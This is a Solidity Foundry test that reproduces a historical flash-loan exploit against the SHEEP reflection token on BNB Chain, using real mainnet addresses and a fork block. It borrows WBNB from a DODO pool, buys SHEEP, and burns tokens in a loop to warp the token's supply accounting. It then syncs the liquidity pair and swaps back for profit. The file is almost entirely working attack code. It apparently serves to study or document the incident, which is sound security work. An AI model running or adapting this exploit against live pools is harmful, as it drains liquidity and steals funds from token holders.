// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./BaseTest.sol";

/*
 Tx hash: https://bscscan.com/tx/0x61293c6dd5211a98f1a26c9f6821146e12fb5e20c850ad3ed2528195c8d4c98e
*/

interface ISheepToken is IERC20 {
    function burn(uint256 amount) external;
}

contract ExploitTest is BaseTest {
    IUniswapV2Router immutable router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 immutable WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ISheepToken immutable SHEEP = ISheepToken(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);
    IUniswapV2Pair immutable SHEEP_WBNB = IUniswapV2Pair(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);
    IDPPOracle immutable dodo = IDPPOracle(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    
    uint256 immutable R_OWNED_SLOT = 1;
    uint256 immutable T_OWNED_SLOT = 2;
    uint256 immutable T_TOTAL_SLOT = 14;
    uint256 immutable R_TOTAL_SLOT = 15;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork("bsc", 25543755);
    }

    function testExploit() public {
        emit log_named_uint(
            "[INFO] SHEEP rTotal amount before exploit", getSlotUint(address(SHEEP), R_TOTAL_SLOT)
        );

        uint256 FLASHLOAN_WBNB_AMOUNT = 380 ether;
        dodo.flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), abi.encode(FLASHLOAN_WBNB_AMOUNT));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        uint256 FLASHLOAN_WBNB_AMOUNT = abi.decode(data, (uint256));

        WBNB.approve(address(router), type(uint256).max);
        SHEEP.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHEEP);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASHLOAN_WBNB_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp
        );

        emit log_named_decimal_uint(
            "[INFO] SHEEP amount in pair before burn", SHEEP.balanceOf(address(SHEEP_WBNB)), 9
        );
        emit log_named_decimal_uint(
            "[INFO] SHEEP amount in attack contract before burn", SHEEP.balanceOf(address(this)), 9
        );
        emit log_named_uint(
            "[INFO] SHEEP rTotal amount before burn", getSlotUint(address(SHEEP), R_TOTAL_SLOT)
        );

        // Decrease tTotal
        while (SHEEP.balanceOf(address(SHEEP_WBNB)) > 2) {
            uint256 burnAmount = SHEEP.balanceOf(address(this));
            SHEEP.burn(burnAmount);
        }
        SHEEP_WBNB.sync();

        emit log_named_uint(
            "[INFO] SHEEP rTotal amount after burn", getSlotUint(address(SHEEP), R_TOTAL_SLOT)
        );
        emit log_named_decimal_uint(
            "[INFO] SHEEP amount in pair after burn", SHEEP.balanceOf(address(SHEEP_WBNB)), 9
        );
        emit log_named_decimal_uint(
            "[INFO] SHEEP amount in attack contract after burn", SHEEP.balanceOf(address(this)), 9
        );

        path[0] = address(SHEEP);
        path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHEEP.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );

        // Repay flashloan
        WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);
    }
}